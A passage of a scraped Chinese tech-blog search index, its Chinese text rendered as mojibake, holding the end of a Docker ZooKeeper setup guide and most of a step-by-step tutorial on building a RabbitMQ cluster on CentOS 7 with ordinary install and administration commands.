peter&lt;peter@gmail.com&gt;ADD jdk-8u201-linux-x64.tar.gz /usr/localADD apache-zookeeper-3.5.5.tar.gz /usr/localRUN yum -y updateRUN yum -y install vim net-tools telnet tree git wget curlENV work_path /usr/localWORKDIR $work_path# JDKENV JAVA_HOME /usr/local/jdk1.8.0_201ENV JRE_HOME /usr/local/jdk1.8.0_201/jreENV CLASSPATH .:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib# ZooKeeperENV ZOOKEEPER_HOME /usr/local/apache-zookeeper-3.5.5# PATHENV PATH $PATH:$JAVA_HOME/bin:$JRE_HOME/bin:$ZOOKEEPER_HOME/binRUN cp $ZOOKEEPER_HOME/conf/zoo_sample.cfg $ZOOKEEPER_HOME/conf/zoo.cfgEXPOSE 2181CMD $ZOOKEEPER_HOME/bin/zkServer.sh start-foreground æ„å»º ZooKeeper é•œåƒï¼Œåˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨12345# æ„å»ºé•œåƒ# docker build -f docker-file -t zookeeper:3.5.5 .# åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨# docker run -d --name zookeeper -p 2181:2181 zookeeper:3.5.5 æµ‹è¯•å®¢æˆ·ç«¯è¿æ¥ ZooKeeper æœåŠ¡å™¨123456789101112131415161718192021222324252627282930313233# è¿æ¥ZooKeeperå®¹å™¨# docker exec -it zookeeper /bin/bash# è¿›å…¥ZooKeeperçš„binç›®å½•# cd apache-zookeeper-3.5.5/bin# å®¢æˆ·ç«¯è¿æ¥ZooKeeperæœåŠ¡å™¨ç«¯$ ./zkCli.sh -server 127.0.0.1:2181# åˆ›å»ºèŠ‚ç‚¹[zk: 127.0.0.1:2181(CONNECTED) 1] create -e /test-node 123456# åˆ—å‡ºæ‰€æœ‰æ ¹èŠ‚ç‚¹[zk: 127.0.0.1:2181(CONNECTED) 2] ls /[test-node, zookeeper]# è·å–æŒ‡å®šèŠ‚ç‚¹çš„å€¼[zk: 127.0.0.1:2181(CONNECTED) 3] get /test-node123456cZxid = 0x4ctime = Fri Feb 22 02:27:43 UTC 2019mZxid = 0x4mtime = Fri Feb 22 02:27:43 UTC 2019pZxid = 0x4cversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x1000a766c5e0001dataLength = 6numChildren = 0# æ–­å¼€å®¢æˆ·ç«¯è¿æ¥[zk: 127.0.0.1:2181(CONNECTED) 4] quit var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Centos7 æ­å»º RabbitMQ é›†ç¾¤ï¼ˆè¶…è¯¦ç»†ï¼‰",url:"/posts/486aeff3.html",text:'å‰è¨€é›†ç¾¤æ¨¡å¼RabbitMQ æ˜¯ç”¨ Erang å¼€å‘çš„ï¼Œé›†ç¾¤æ¨¡å¼åˆ†ä¸ºä¸¤ç§æ™®é€šæ¨¡å¼ å’Œé•œåƒæ¨¡å¼ï¼Œå¯ä»¥è¯´é•œåƒæ¨¡å¼æ˜¯æ™®é€šæ¨¡å¼çš„å‡çº§ç‰ˆï¼Œå…¶ä¸­ RabbitMQ é»˜è®¤ä½¿ç”¨çš„æ˜¯ æ™®é€šæ¨¡å¼ã€‚ æ™®é€šæ¨¡å¼ï¼šä»¥ä¸¤ä¸ªèŠ‚ç‚¹ï¼ˆrabbit01ã€rabbit02ï¼‰ä¸ºä¾‹æ¥è¿›è¡Œè¯´æ˜ï¼Œrabbit01 å’Œ rabbit02 ä¸¤ä¸ªèŠ‚ç‚¹ä»…æœ‰ç›¸åŒçš„å…ƒæ•°æ®ï¼Œå³é˜Ÿåˆ—çš„ç»“æ„ï¼Œä½†æ¶ˆæ¯å®ä½“åªå­˜åœ¨äºå…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹ rabbit01ï¼ˆæˆ–è€… rabbit02ï¼‰ä¸­ã€‚å½“æ¶ˆæ¯è¿›å…¥ rabbit01 èŠ‚ç‚¹çš„ Queue åï¼Œconsumer ä» rabbit02 èŠ‚ç‚¹æ¶ˆè´¹æ—¶ï¼ŒRabbitMQ ä¼šä¸´æ—¶åœ¨ rabbit01ã€rabbit02 é—´è¿›è¡Œæ¶ˆæ¯ä¼ è¾“ï¼ŒæŠŠ A ä¸­çš„æ¶ˆæ¯å®ä½“å–å‡ºå¹¶ç»è¿‡ B å‘é€ç»™ consumerã€‚æ‰€ä»¥ consumer åº”å°½é‡è¿æ¥æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä»ä¸­å–æ¶ˆæ¯ã€‚å³å¯¹äºåŒä¸€ä¸ªé€»è¾‘é˜Ÿåˆ—ï¼Œè¦åœ¨å¤šä¸ªèŠ‚ç‚¹å»ºç«‹ç‰©ç† Queueã€‚å¦åˆ™æ— è®º consumer è¿ rabbit01 æˆ– rabbit02ï¼Œå‡ºå£æ€»åœ¨ rabbit01ï¼Œä¼šäº§ç”Ÿç“¶é¢ˆã€‚å½“ rabbit01 èŠ‚ç‚¹æ•…éšœåï¼Œrabbit02 èŠ‚ç‚¹æ— æ³•å–åˆ° rabbit01 èŠ‚ç‚¹ä¸­è¿˜æœªæ¶ˆè´¹çš„æ¶ˆæ¯å®ä½“ã€‚å¦‚æœåšäº†æ¶ˆæ¯æŒä¹…åŒ–ï¼Œé‚£ä¹ˆå¾—ç­‰ rabbit01 èŠ‚ç‚¹æ¢å¤ï¼Œç„¶åæ‰å¯è¢«æ¶ˆè´¹ï¼›å¦‚æœæ²¡æœ‰æŒä¹…åŒ–çš„è¯ï¼Œå°±ä¼šäº§ç”Ÿæ¶ˆæ¯ä¸¢å¤±çš„ç°è±¡ã€‚ é•œåƒæ¨¡å¼ï¼šåœ¨æ™®é€šæ¨¡å¼çš„åŸºç¡€ä¸Šï¼ŒæŠŠéœ€è¦çš„é˜Ÿåˆ—åšæˆé•œåƒé˜Ÿåˆ—ï¼Œå­˜åœ¨äºå¤šä¸ªèŠ‚ç‚¹ï¼Œæ¶ˆæ¯å®ä½“ä¼šä¸»åŠ¨åœ¨é•œåƒèŠ‚ç‚¹é—´åŒæ­¥ï¼Œè€Œä¸æ˜¯åœ¨å®¢æˆ·ç«¯å–æ•°æ®æ—¶ä¸´æ—¶æ‹‰å–ï¼Œä¹Ÿå°±æ˜¯è¯´å¤šå°‘èŠ‚ç‚¹æ¶ˆæ¯å°±ä¼šå¤‡ä»½å¤šå°‘ä»½ã€‚è¯¥æ¨¡å¼å¸¦æ¥çš„å‰¯ä½œç”¨ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œé™¤äº†é™ä½ç³»ç»Ÿæ€§èƒ½å¤–ï¼Œå¦‚æœé•œåƒé˜Ÿåˆ—æ•°é‡è¿‡å¤šï¼ŒåŠ ä¹‹å¤§é‡çš„æ¶ˆæ¯è¿›å…¥ï¼Œé›†ç¾¤å†…éƒ¨çš„ç½‘ç»œå¸¦å®½å°†ä¼šè¢«è¿™ç§åŒæ­¥é€šè®¯å¤§å¤§æ¶ˆè€—æ‰ï¼Œæ‰€ä»¥åœ¨å¯¹ä¸šåŠ¡å¯é æ€§è¦æ±‚è¾ƒé«˜çš„åœºåˆä¸­é€‚ç”¨ã€‚ç”±äºé•œåƒé˜Ÿåˆ—ä¹‹é—´æ¶ˆæ¯è‡ªåŠ¨åŒæ­¥ï¼Œä¸”å†…éƒ¨æœ‰é€‰ä¸¾ Master æœºåˆ¶ï¼Œå³ä½¿ Master èŠ‚ç‚¹å®•æœºä¹Ÿä¸ä¼šå½±å“æ•´ä¸ªé›†ç¾¤çš„ä½¿ç”¨ï¼Œè¾¾åˆ°å»ä¸­å¿ƒåŒ–çš„ç›®çš„ï¼Œä»è€Œæœ‰æ•ˆçš„é˜²æ­¢æ¶ˆæ¯ä¸¢å¤±åŠæœåŠ¡ä¸å¯ç”¨ç­‰é—®é¢˜ é›†ç¾¤èŠ‚ç‚¹çš„åŒºåˆ«RabbitMQ çš„é›†ç¾¤èŠ‚ç‚¹åˆ†ä¸ºç£ç›˜èŠ‚ç‚¹ã€å†…å­˜èŠ‚ç‚¹ã€‚RabbitMQ æ”¯æŒæ¶ˆæ¯çš„æŒä¹…åŒ–ï¼Œä¹Ÿå°±æ˜¯æ•°æ®å†™åœ¨ç£ç›˜ä¸Šã€‚åœ¨ RabbitMQ é›†ç¾¤ä¸­ï¼Œå¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ªç£ç›˜èŠ‚ç‚¹ï¼Œå¦åˆ™é˜Ÿåˆ—å…ƒæ•°æ®æ— æ³•å†™å…¥åˆ°é›†ç¾¤ä¸­ã€‚å½“ç£ç›˜èŠ‚ç‚¹å®•æ‰æ—¶ï¼Œé›†ç¾¤å°†æ— æ³•å†™å…¥æ–°çš„é˜Ÿåˆ—å…ƒæ•°æ®ä¿¡æ¯ã€‚å¦‚æœ RabbitMQ é›†ç¾¤å…¨éƒ¨å®•æœºï¼Œå¿…é¡»å…ˆå¯åŠ¨ç£ç›˜èŠ‚ç‚¹ï¼Œç„¶åå†å¯åŠ¨å†…å­˜èŠ‚ç‚¹ã€‚æœ€åˆé€‚çš„æ–¹æ¡ˆå°±æ˜¯æ—¢æœ‰ç£ç›˜èŠ‚ç‚¹ï¼Œåˆæœ‰å†…å­˜èŠ‚ç‚¹ï¼Œæ¨è 1 ä¸ª ç£ç›˜èŠ‚ç‚¹ + 2 ä¸ªå†…å­˜èŠ‚ç‚¹çš„é›†ç¾¤æ­å»ºæ–¹å¼ã€‚ å‡†å¤‡å·¥ä½œé›†ç¾¤è§„åˆ’ åç§° IP ç«¯å£ ç”¨é€” RabbitMQ èŠ‚ç‚¹åç§° èŠ‚ç‚¹ä¸€ 192.168.1.109 15672 ç£ç›˜èŠ‚ç‚¹ rabbit@rabbitmq1 èŠ‚ç‚¹äºŒ 192.168.1.201 15672 å†…å­˜èŠ‚ç‚¹ rabbit@rabbitmq2 èŠ‚ç‚¹ä¸‰ 192.168.1.200 15672 å†…å­˜èŠ‚ç‚¹ rabbit@rabbitmq3 æ³¨æ„ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒæ­å»º RabbitMQ é›†ç¾¤æ—¶ï¼Œæ‰€æœ‰é›†ç¾¤èŠ‚ç‚¹è¦æ±‚éƒ½å¯ä»¥è¿æ¥ä¸Šäº’è”ç½‘ï¼Œå¦å¤– RabbitMQ é›†ç¾¤èŠ‚ç‚¹å»ºè®®éƒ½åœ¨åŒä¸€ç½‘æ®µé‡Œï¼Œå¦‚æœæ˜¯è·¨å¹¿åŸŸç½‘ï¼ˆå¤–ç½‘ï¼‰ï¼Œæ•ˆæœä¼šå˜å·®ã€‚ ç³»ç»Ÿåˆå§‹åŒ– æ›´æ”¹ç³»ç»Ÿçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° åˆ›å»ºç”¨æˆ·å’Œç”¨æˆ·ç»„12345# åˆ›å»ºrabbitmqç”¨æˆ·ç»„# groupadd rabbitmq# åˆ›å»ºrabbitmqç”¨æˆ·ï¼ˆä¸å…è®¸è¿œç¨‹ç™»å½•ï¼‰# useradd -g rabbitmq rabbitmq -s /bin/false RabbitMQ é›†ç¾¤å®‰è£…Erlang å®‰è£…åœ¨æ¯ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸Šåˆ†åˆ«ç¼–è¯‘å®‰è£… Erlangï¼Œè¿™é‡Œä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯ 23.2ï¼Œå…¶ä»–ç‰ˆæœ¬çš„ Erlang å¯ä»¥ä» Erlang å®˜ç½‘ ä¸‹è½½ 1234567891011121314151617181920212223242526272829303132# å®‰è£…ä¾èµ–# yum install -y make autoconf gcc gcc-c++ glibc-devel kernel-devel m4 ncurses-devel openssl-devel unixODBC unixODBC-devel libtool libtool-ltdl-devel unzip# åˆ›å»ºå®‰è£…ç›®å½•# mkdir -p /usr/local/erlang-23.2# ä¸‹è½½# wget https://erlang.org/download/otp_src_23.2.tar.gz# è§£å‹# tar -xvf otp_src_23.2.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd otp_src_23.2# é…ç½®# ./otp_build autoconf# ./configure --prefix=/usr/local/erlang-23.2 --without-javac# ç¼–è¯‘å®‰è£…# make &amp;&amp; make install# åˆ›å»ºè½¯é“¾æ¥# ln -sf /usr/local/erlang-23.2/bin/erl /usr/bin/erl# é…ç½®ç¯å¢ƒå˜é‡# vim /etc/profileexport ERLANG_HOME=/usr/local/erlang-23.2export PATH=$PATH:$ERLANG_HOME/bin# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile RabbitMQ å®‰è£…åœ¨æ¯ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸Šåˆ†åˆ«ä½¿ç”¨äºŒè¿›åˆ¶åŒ…çš„æ–¹å¼å®‰è£… RabbitMQï¼Œä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯ 3.8.6ï¼Œå…¶ä»–ç‰ˆæœ¬çš„ RabbitMQ å¯ä»¥ä» RabbitMQ Github ä¸‹è½½ 123456789101112131415# å®‰è£…ä¾èµ–# yum install -y xmlto python-simplejson# ä¸‹è½½# wget https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.6/rabbitmq-server-generic-unix-3.8.6.tar.xz# è§£å‹# xz -d rabbitmq-server-generic-unix-3.8.6.tar.xz# tar -xvf rabbitmq-server-generic-unix-3.8.6.tar# æ‹·è´å®‰è£…æ–‡ä»¶# cp -r rabbitmq_server-3.8.6 /usr/local/rabbitmq# æ–‡ä»¶æˆæƒ# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq RabbitMQ é…ç½®åœ¨æ¯ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸Šåˆ†åˆ«é…ç½® RabbitMQï¼ŒåŒ…æ‹¬åˆ›å»ºé»˜è®¤çš„æ—¥å¿—ç›®å½•ä¸æ•°æ®ç›®å½•ã€å¯ç”¨ Web æ§åˆ¶å°ç®¡ç†æ’ä»¶ 123456789101112131415161718192021# åˆ›å»ºé»˜è®¤çš„æ—¥å¿—ç›®å½•ä¸æ•°æ®ç›®å½•# mkdir -p /usr/local/rabbitmq/var/log/rabbitmq# mkdir -p /usr/local/rabbitmq/var/lib/rabbitmq/mnesia# åˆ›å»ºé»˜è®¤çš„é…ç½®æ–‡ä»¶# touch /usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config# echo "[]." &gt; /usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config# åˆ›å»ºé»˜è®¤çš„ç¯å¢ƒå˜é‡æ–‡ä»¶# touch /usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf# echo "CONF_ENV_FILE=/usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf" &gt;&gt; /usr/local/rabbitmq/sbin/rabbitmq-defaults# å¯ç”¨Webæ§åˆ¶å°ç®¡ç†æ’ä»¶# cd /usr/local/rabbitmq/sbin# ./rabbitmq-plugins enable rabbitmq_management# æŸ¥çœ‹æ‰€æœ‰æ’ä»¶çš„å®‰è£…ä¿¡æ¯# ./rabbitmq-plugins list# æ–‡ä»¶æˆæƒ# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq åœ¨æ¯ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸Šåˆ†åˆ«é…ç½® RabbitMQï¼ŒåŒ…æ‹¬åˆ›å»ºè™šæ‹Ÿä¸»æœºã€è¶…çº§ç®¡ç†å‘˜ç”¨æˆ·ã€è®¾ç½®è§’è‰²æƒé™ã€‚ç”±äºå‡ºäºç³»ç»Ÿå®‰å…¨è€ƒè™‘ï¼ŒRabbitMQ é»˜è®¤é™åˆ¶äº† guest ç”¨æˆ·åªèƒ½é€šè¿‡ localhost ç™»å½•ä½¿ç”¨ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ›å»ºç®¡ç†å‘˜å¸å·ï¼Œå¹¶æ›´æ”¹ guest ç”¨æˆ·é»˜è®¤çš„å¯†ç  1234567891011121314151617181920212223242526# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/rabbitmq/sbin# å‰å°å¯åŠ¨RabbitMQæœåŠ¡ï¼ˆé»˜è®¤ä¼šæ‰“å°å‡ºæ—¥å¿—æ–‡ä»¶å’Œé…ç½®æ–‡ä»¶çš„è·¯å¾„ï¼‰# ./rabbitmq-server# æˆ–è€…åå°å¯åŠ¨RabbitMQæœåŠ¡# ./rabbitmq-server -detached# åˆ›å»ºè™šæ‹Ÿä¸»æœºï¼ˆç›¸å½“äºMySQLçš„æ•°æ®åº“æ¦‚å¿µï¼‰# ./rabbitmqctl add_vhost /# æ›´æ”¹guestç”¨æˆ·é»˜è®¤çš„å¯†ç # ./rabbitmqctl change_password guest yourPassword# åˆ›å»ºè¶…çº§ç®¡ç†å‘˜ç”¨æˆ·# ./rabbitmqctl add_user admin yourPassword# èµ‹äºˆadministratorè§’è‰²ç»™è¶…çº§ç®¡ç†å‘˜ç”¨æˆ·# ./rabbitmqctl set_user_tags admin administrator# èµ‹äºˆè¶…çº§ç®¡ç†å‘˜ç”¨æˆ·æƒé™# ./rabbitmqctl set_permissions -p / admin \'.*\' \'.*\' \'.*\'# å½»åº•å…³é—­åå°å¯åŠ¨çš„RabbitMQæœåŠ¡# ./rabbitmqctl stop RabbitMQ æ™®é€šé›†ç¾¤æ­å»ºæ·»åŠ èŠ‚ç‚¹ä¸»æœºååœ¨æ¯ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸Šåˆ†åˆ«ç¼–è¾‘ /etc/hosts é…ç½®æ–‡ä»¶ï¼ŒæŒ‡å®šå„ä¸ªèŠ‚ç‚¹çš„ä¸»æœºå 1234# vim /etc/hosts192.168.1.109 rabbitmq1192.168.1.201 rabbitmq2192.168.1.200 rabbitmq3 é…ç½®èŠ‚ç‚¹çš„åç§°RabbitMQ èŠ‚ç‚¹ç”±èŠ‚ç‚¹åç§°ï¼ˆRABBITMQ_NODENAMEï¼‰æ ‡è¯†ï¼ŒèŠ‚ç‚¹åç§°ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰ç¼€ï¼ˆé»˜è®¤æ˜¯ rabbitï¼‰å’Œä¸»æœºåï¼Œä¾‹å¦‚ï¼šrabbit@rabbit1 æ˜¯ä¸€ä¸ªåŒ…å«å‰ç¼€ rabbit å’Œä¸»æœºå rabbit1 çš„èŠ‚ç‚¹åç§°ã€‚å¯ä»¥åœ¨åŒä¸€å°ä¸»æœºä¸Šè¿è¡Œå¤šä¸ª RabbitMQ èŠ‚ç‚¹ï¼Œä½†é›†ç¾¤ä¸­æ¯ä¸ªèŠ‚ç‚¹å¿…é¡»æœ‰ä¸€ä¸ªå”¯ä¸€çš„ RABBITMQ_NODENAMEã€‚è‹¥åœ¨åŒä¸€å°ä¸»æœºä¸Šè¿è¡Œå¤šä¸ªèŠ‚ç‚¹ï¼ˆå¼€å‘å’Œ QA ç¯å¢ƒä¸­é€šå¸¸æ˜¯è¿™ç§æƒ…å†µï¼‰ï¼Œæ¯ä¸ªèŠ‚ç‚¹è¿˜å¿…é¡»ä½¿ç”¨ä¸åŒçš„å‰ç¼€ï¼Œä¾‹å¦‚ï¼šrabbit1@hostname1 å’Œ rabbit2@hostname2ã€‚åœ¨é›†ç¾¤ä¸­ï¼ŒèŠ‚ç‚¹ä½¿ç”¨èŠ‚ç‚¹åç§°æ ‡è¯†å’Œè”ç³»å½¼æ­¤ï¼Œè¿™æ„å‘³ç€å¿…é¡»è§£ææ¯ä¸ªèŠ‚ç‚¹åçš„ä¸»æœºåéƒ¨åˆ†ã€‚å½“èŠ‚ç‚¹å¯åŠ¨æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥æ˜¯å¦å·²ä¸ºå…¶åˆ†é…äº†èŠ‚ç‚¹åï¼Œè¿™æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶ rabbitmq-env.conf é‡Œçš„ RABBITMQ_NODENAME ç¯å¢ƒå˜é‡æŒ‡å®šï¼Œå¦‚æœç¯å¢ƒå˜é‡æ²¡æœ‰é…ç½®ï¼Œåˆ™èŠ‚ç‚¹å°†è§£æå…¶ä¸»æœºåå¹¶åœ¨å…¶å‰é¢æ·»åŠ  rabbit æ¥è®¡ç®—å…¶èŠ‚ç‚¹åã€‚ åœ¨æ¯ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸Šåˆ†åˆ«é…ç½®èŠ‚ç‚¹åç§°ï¼Œåªéœ€å°†ä¸‹é¢ rabbit@xxx ä¸­çš„ xxx æ›¿æ¢ä¸ºè¯¥èŠ‚ç‚¹çš„ä¸»æœºåå³å¯ï¼Œä¾‹å¦‚èŠ‚ç‚¹ä¸€çš„èŠ‚ç‚¹åç§°ä¸ºï¼š rabbit@rabbitmq1 12# é…ç½®èŠ‚ç‚¹åç§°# echo "NODENAME=rabbit@xxx" &gt;&gt; /usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf æ‹·è´ Erlang CookieRabbitMQ çš„é›†ç¾¤æ˜¯ä¾é™„äº Erlang çš„é›†ç¾¤æ¥å·¥ä½œçš„ï¼Œæ‰€ä»¥å¿…é¡»å…ˆæ„å»ºèµ· Erlang çš„é›†ç¾¤ã€‚Erlang çš„é›†ç¾¤ä¸­å„èŠ‚ç‚¹æ˜¯ç»ç”±è¿‡ç¨‹ä¸€ä¸ª cookie æ¥å®ç°çš„ï¼Œå½“ä½¿ç”¨è§£å‹ç¼©çš„æ–¹å¼æ¥å®‰è£… RabbitMQ æ—¶ï¼Œé‚£ä¹ˆè¿™ä¸ª cookie å­˜æ”¾åœ¨ ${home}/.erlang.cookie ä¸­ï¼Œæ–‡ä»¶æ˜¯ 400 çš„æƒé™ã€‚å¿…é¡»ä¿è¯é›†ç¾¤å„èŠ‚ç‚¹çš„ cookie ä¸€è‡´ï¼Œä¸ç„¶èŠ‚ç‚¹ä¹‹é—´å°±æ— æ³•é€šä¿¡ã€‚ 123# æ‹·è´èŠ‚ç‚¹ä¸€çš„Cookieåˆ°å…¶ä»–èŠ‚ç‚¹# scp /root/.erlang.cookie root@rabbitmq2:/root/# scp /root/.erlang.cookie root@rabbitmq3:/root/ æ„å»ºé›†ç¾¤èŠ‚ç‚¹åœ¨æ¯ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸Šåˆ†åˆ«å¯åŠ¨ RabbitMQ çš„æœåŠ¡ï¼Œè¿™é‡Œé»˜è®¤ä½¿ç”¨çš„ç”¨æˆ·ä¸º rootã€‚å½“ä½¿ç”¨è§£å‹ç¼©çš„æ–¹å¼æ¥å®‰è£… RabbitMQ æ—¶ï¼Œcookie æ˜¯å­˜æ”¾åœ¨ ${home}/.erlang.cookieï¼Œå› æ­¤è¿™é‡Œå¿…é¡»æ³¨æ„å„ä¸ªèŠ‚ç‚¹çš„ RabbitMQ æ˜¯ä½¿ç”¨å“ªä¸ªç”¨æˆ·å¯åŠ¨ï¼Œå¦åˆ™åç»­å¾ˆå¯èƒ½ç”±äºå„èŠ‚ç‚¹çš„ .erlang.cookie ä¸ä¸€è‡´è€Œå¯¼è‡´èŠ‚ç‚¹æ— æ³•åŠ å…¥é›†ç¾¤ã€‚ 12345# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/rabbitmq/sbin# åå°å¯åŠ¨RabbitMQæœåŠ¡# ./rabbitmq-server -detached åœ¨èŠ‚ç‚¹äºŒæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼Œå°†èŠ‚ç‚¹äºŒï¼ˆrabbit@rabbitmq2ï¼‰åŠ å…¥åˆ° RabbitMQ é›†ç¾¤ 1234567891011# è¿›å…¥èŠ‚ç‚¹äºŒçš„å®‰è£…ç›®å½•# cd /usr/local/rabbitmq/sbin# åœæ­¢èŠ‚ç‚¹äºŒçš„RabbitMQçš„æœåŠ¡# ./rabbitmqctl -n rabbit@rabbitmq2 stop_app# å°†èŠ‚ç‚¹äºŒåŠ å…¥åˆ°é›†ç¾¤ä¸­ï¼Œ"--ram" è¡¨ç¤ºèŠ‚ç‚¹äºŒä¸ºå†…å­˜èŠ‚ç‚¹# ./rabbitmqctl -n rabbit@rabbitmq2 join_cluster rabbit@rabbitmq1 --ram# å¯åŠ¨èŠ‚ç‚¹äºŒçš„RabbitMQæœåŠ¡# ./rabbitmqctl -n rabbit@rabbitmq2 start_app åœ¨èŠ‚ç‚¹ä¸‰æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼Œå°†èŠ‚ç‚¹ä¸‰ï¼ˆrabbit@rabbitmq3ï¼‰åŠ å…¥åˆ° RabbitMQ é›†ç¾¤ 1234567891011# è¿›å…¥èŠ‚ç‚¹ä¸‰çš„å®‰è£…ç›®å½•# cd /usr/local/rabbitmq/sbin# åœæ­¢èŠ‚ç‚¹ä¸‰çš„RabbitMQçš„æœåŠ¡# ./rabbitmqctl -n rabbit@rabbitmq3 stop_app# å°†èŠ‚ç‚¹ä¸‰åŠ å…¥åˆ°é›†ç¾¤ä¸­ï¼Œ"--ram" è¡¨ç¤ºèŠ‚ç‚¹ä¸‰ä¸ºå†…å­˜èŠ‚ç‚¹# ./rabbitmqctl -n rabbit@rabbitmq3 join_cluster rabbit@rabbitmq1 --ram# å¯åŠ¨èŠ‚ç‚¹ä¸‰çš„RabbitMQçš„æœåŠ¡# ./rabbitmqctl -n rabbit@rabbitmq3 start_app åœ¨ä»»æ„èŠ‚ç‚¹ä¸ŠæŸ¥çœ‹é›†ç¾¤çš„çŠ¶æ€ 12345# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/rabbitmq/sbin# æŸ¥çœ‹é›†ç¾¤çŠ¶æ€# ./rabbitmqctl cluster_status æ­å»ºé›†ç¾¤æ—¶ï¼Œåœæ­¢ RabbitMQ æœåŠ¡å¿…é¡»ä½¿ç”¨ stop_app å‘½ä»¤ï¼Œè€Œä¸æ˜¯ stop å‘½ä»¤ï¼Œå¦åˆ™æ— æ³•å°†èŠ‚ç‚¹åŠ å…¥åˆ°é›†ç¾¤ä¸­ é»˜è®¤æƒ…å†µä¸‹ï¼ŒRabbitMQ å¯åŠ¨åæ˜¯ç£ç›˜èŠ‚ç‚¹ï¼Œåœ¨ä¸Šé¢çš„ join_cluster å‘½ä»¤ä¸‹ï¼Œrabbitmq2 å’Œ rabbitmq3 æ˜¯å†…å­˜èŠ‚ç‚¹ï¼Œrabbitmq1 æ˜¯ç£ç›˜èŠ‚ç‚¹ è‹¥è¦ä½¿ rabbitmq2 å’Œ rabbitmq3 éƒ½æˆä¸ºç£ç›˜èŠ‚ç‚¹ï¼Œå»æ‰ --ram å‚æ•°å³å¯ï¼Œæˆ–è€…ä½¿ç”¨ --disc å‚æ•°æ›¿ä»£ å¦‚æœæƒ³è¦æ›´æ”¹èŠ‚ç‚¹ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ rabbitmqctl change_cluster_node_type disc(ram)ï¼Œå‰ææ˜¯å¿…é¡»åœæ‰ RabbitMQ æœåŠ¡ æµ‹è¯•é›†ç¾¤èŠ‚ç‚¹è‹¥é›†ç¾¤èŠ‚ç‚¹æ„å»ºæˆåŠŸï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—®ä»»æ„èŠ‚ç‚¹çš„ Web æ§åˆ¶å°ï¼Œä¾‹å¦‚ http://192.168.1.109:15672ï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹çš„å†…å®¹ã€‚æœ€åå¯ä»¥åœ¨èŠ‚ç‚¹ä¸€åˆ›å»ºé˜Ÿåˆ— testï¼Œå¦‚æœåœ¨èŠ‚ç‚¹äºŒã€èŠ‚ç‚¹ä¸‰çš„ Web æ§åˆ¶å°ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°å¯¹åº”çš„ test é˜Ÿåˆ—ï¼Œåˆ™è¯´æ˜å„é›†ç¾¤èŠ‚ç‚¹çš„å…ƒæ•°æ®ï¼ˆé˜Ÿåˆ—çš„ç»“æ„ï¼‰åŒæ­¥æ­£å¸¸ã€‚è‡³æ­¤ï¼ŒRabbitMQ çš„æ™®é€šé›†ç¾¤æ­å»ºå®Œæˆã€‚ RabbitMQ é•œåƒé›†ç¾¤æ­å»ºä¸Šé¢å·²ç»å®Œæˆ RabbitMQ 